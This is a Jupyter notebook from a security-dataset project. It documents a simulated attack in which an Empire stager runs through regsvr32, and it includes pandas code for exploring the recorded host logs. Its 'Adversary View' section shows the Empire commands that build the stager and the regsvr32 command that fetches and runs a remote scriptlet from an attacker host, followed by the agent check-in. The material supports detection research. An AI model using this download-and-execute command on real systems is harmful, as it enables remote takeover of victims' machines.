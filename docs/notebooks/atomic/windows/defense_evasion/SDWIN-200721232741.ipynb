{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "fc58e7fb",
   "metadata": {},
   "source": [
    "# Empire Regsvr32 Execution"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "108aafeb",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52ae3590",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/07/21 |\n",
    "| Modification Date | 2020/07/21 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1218.010](https://attack.mitre.org/techniques/T1218/010) |\n",
    "| Tags              | Regsvr32 Execution |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1f8638cc",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors leveraging regsvr32 to proxy the execution of an empire payload (.sct file) to create a reverse connection to the C2."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4c4dac46",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fc876ed4",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_launcher_sct_regsvr32.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_launcher_sct_regsvr32.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "38e6ba57",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "daea5eb4",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a433ebdd",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [launcher](https://github.com/BC-SECURITY/Empire/blob/master/lib/stagers/windows/launcher_sct.py) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "36732f4b",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Threat Actor View:\n",
    "(Empire) > usestager windows/launcher_sct\n",
    "(Empire: stager/windows/launcher_sct) > info\n",
    "\n",
    "Name: regsvr32\n",
    "\n",
    "Description:\n",
    "  Generates an sct file (COM Scriptlet) Host this\n",
    "  anywhere\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value             Description\n",
    "  ----             --------    -------           -----------\n",
    "  Listener         True                          Listener to generate stager for.\n",
    "  Language         True        powershell        Language of the stager to generate.\n",
    "  StagerRetries    False       0                 Times for the stager to retry\n",
    "                                                connecting.\n",
    "  Base64           True        True              Switch. Base64 encode the output.\n",
    "  Obfuscate        False       False             Switch. Obfuscate the launcher\n",
    "                                                powershell code, uses the\n",
    "                                                ObfuscateCommand for obfuscation types.\n",
    "                                                For powershell only.\n",
    "  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n",
    "                                                Only used if Obfuscate switch is True.\n",
    "                                                For powershell only.\n",
    "  OutFile          False       /tmp/launcher.sct File to output SCT to, otherwise\n",
    "                                                displayed on the screen.\n",
    "  UserAgent        False       default           User-agent string to use for the staging\n",
    "                                                request (default, none, or other).\n",
    "  Proxy            False       default           Proxy to use for request (default, none,\n",
    "                                                or other).\n",
    "  ProxyCreds       False       default           Proxy credentials\n",
    "                                                ([domain\\]username:password) to use for\n",
    "                                                request (default, none, or other).\n",
    "\n",
    "\n",
    "(Empire: stager/windows/launcher_sct) > set Listener http\n",
    "(Empire: stager/windows/launcher_sct) > execute\n",
    "\n",
    "[*] Stager output written out to: /tmp/launcher.sct\n",
    "\n",
    "Victim's PC\n",
    "\n",
    "PS C:\\Windows\\System32> .\\regsvr32.exe /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll\n",
    "\n",
    "Threat Actor View:\n",
    "\n",
    "(Empire: stager/windows/launcher_sct) > back\n",
    "(Empire) > \n",
    "Empire: agents) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent 712ETU3B checked in\n",
    "[+] Initial agent 712ETU3B from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 712ETU3B at 172.18.39.5\n",
    "\n",
    "(Empire: agents) > \n",
    "(Empire: agents) > \n",
    "(Empire: agents) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\\pgustavo        powershell         9076   5/0.0    2020-07-22 03:29:27  http            \n",
    "\n",
    "(Empire: agents) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cb7b6879",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "141818a7",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "714b92e8",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_launcher_sct_regsvr32.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ce1d3bde",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2fc7d759",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d64e0de",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "464b4320",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "495a6bd5",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
